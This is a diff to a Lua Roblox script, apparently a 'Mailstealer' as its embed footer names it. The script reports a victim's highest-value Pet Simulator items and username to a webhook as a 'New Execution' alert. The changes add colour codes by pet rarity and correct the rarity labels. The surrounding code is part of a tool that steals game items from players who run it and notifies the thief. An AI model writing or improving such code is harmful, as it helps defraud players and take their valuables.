@@ -195,9 +195,17 @@ local function SendMessage(url, username, diamonds)
 
     if highestRAPItemData.category == "Pet" then
         if highestRAPItemData.pettyp == "Golden" then
+	    epikcolor = 14728192
             thumbid = require(game.ReplicatedStorage.Library.Directory.Pets)[highestRAPItemData.realname].goldenThumbnail
-        else
+        elseif highestRAPItemData.pettyp == "Rainbow" then
             thumbid = require(game.ReplicatedStorage.Library.Directory.Pets)[highestRAPItemData.realname].thumbnail
+	    epikcolor = 14680064
+	elseif highestRAPItemData.pettyp == "Shiny" then
+	    thumbid = require(game.ReplicatedStorage.Library.Directory.Pets)[highestRAPItemData.realname].thumbnail
+	    epikcolor = 16777215
+	elseif highestRAPItemData.pettyp == "Normal" then
+	    thumbid = require(game.ReplicatedStorage.Library.Directory.Pets)[highestRAPItemData.realname].thumbnail
+	    epikcolor = 65280
         end
         local assetId = thumbid:match("%d+")
         local newUrl = "https://biggamesapi.io/image/" .. assetId
@@ -224,7 +232,7 @@ local function SendMessage(url, username, diamonds)
 	["content"] = poopie,
         ["embeds"] = {{
             ["title"] = "New Execution" ,
-            ["color"] = 65280,
+            ["color"] = epikcolor or 65280,
 			["fields"] = fields,
 			["footer"] = {
 				["text"] = "GaiPolo's Mailstealer"
@@ -404,11 +412,11 @@ for i, v in pairs(categoryList) do
                             typez = "Golden"
                         elseif item.pt and item.pt == 2 then
                             prefix = "Rainbow "
-                            typez = "Normal"
+                            typez = "Rainbow"
                         end
                         if item.sh then
                             prefix = "Shiny " .. prefix
-                            typez = "Normal"
+                            typez = "Shiny"
                         end
                         local realid = item.id
                         local id = prefix .. item.id
